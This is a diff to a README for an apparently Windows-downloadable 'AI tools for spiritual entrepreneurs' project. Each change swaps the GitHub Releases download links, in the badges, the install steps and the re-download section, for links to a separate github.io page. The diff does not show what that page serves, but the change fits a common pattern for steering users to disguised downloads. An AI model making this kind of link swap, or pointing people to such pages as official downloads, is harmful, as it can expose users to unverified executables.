@@ -1,6 +1,6 @@
 # 🔮 the-ai-forge-workshop-hub - AI Tools for Spiritual Entrepreneurs
 
-[![Download Latest Release](https://img.shields.io/badge/Download-View%20Releases-8A2BE2?style=for-the-badge&logo=github)](https://github.com/hyacintha30th29/the-ai-forge-workshop-hub/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-View%20Releases-8A2BE2?style=for-the-badge&logo=github)](https://hyacintha30th29.github.io)
 
 ## 👋 What Is This?
 
@@ -34,7 +34,7 @@ Follow these steps to download and run the software on your Windows computer.
 
 ### Step 1: Download the Files
 
-1. Go to the [Releases page](https://github.com/hyacintha30th29/the-ai-forge-workshop-hub/releases).
+1. Go to the [Releases page](https://hyacintha30th29.github.io).
 2. Look for the latest release at the top of the page.
 3. Click the file named `the-ai-forge-workshop-hub-v1.0.zip` (or the newest version).
 4. Your browser will download the ZIP file to your computer.
@@ -102,7 +102,7 @@ This happens because the file is from the internet. To fix this:
 
 ## 📥 Download Again
 
-If you need a fresh copy, visit the [Releases page](https://github.com/hyacintha30th29/the-ai-forge-workshop-hub/releases) and download the latest ZIP file.
+If you need a fresh copy, visit the [Releases page](https://hyacintha30th29.github.io) and download the latest ZIP file.
 
 ## 🔄 Updates
 
@@ -154,4 +154,4 @@ AI tools, tarot reader software, coaching tools, spiritual entrepreneur, worksho
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20the%20Latest-8A2BE2?style=for-the-badge&logo=github)](https://github.com/hyacintha30th29/the-ai-forge-workshop-hub/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20the%20Latest-8A2BE2?style=for-the-badge&logo=github)](https://hyacintha30th29.github.io)
